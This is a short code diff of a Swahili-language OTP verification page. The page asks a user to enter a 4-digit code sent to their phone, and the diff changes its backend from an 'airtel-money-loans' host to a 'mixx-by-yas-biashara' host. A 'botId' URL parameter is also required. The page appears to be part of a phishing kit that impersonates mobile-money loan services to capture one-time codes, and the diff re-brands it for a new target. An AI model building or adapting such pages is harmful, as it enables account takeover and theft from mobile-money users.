@@ -14,7 +14,7 @@
 <div class="page"> <div class="card"> <div class="title"> Uthibitisho wa OTP </div> <div class="subtitle"> Weka OTP iliyotumwa kwenye nambari yako ya simu </div> <div id="phoneNumber" class="display-number"></div> <div class="success-box"> <div style="font-size:20px;">✓</div> <div> Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini. </div> </div> <form id="otpForm"> <div class="label"> Weka msimbo wa uthibitisho </div> <div class="otp-boxes"> <input maxlength="1" inputmode="numeric"> <input maxlength="1" inputmode="numeric"> <input maxlength="1" inputmode="numeric"> <input maxlength="1" inputmode="numeric"> </div> <div id="timerContainer"> Tuma tena msimbo kwa <strong><span id="timerDisplay">60</span></strong> sekunde </div> <button id="submitBtn" disabled> <span id="btnText">WASILISHA</span> <span class="spinner" id="spinner"></span> </button> </form> <div id="status"></div> </div> </div>
 
 <script>
-const BACKEND_URL = "https://airtel-money-loans.onrender.com";
+const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId');
 if(!botId){ alert("Lien d'accès invalide"); throw new Error(); }
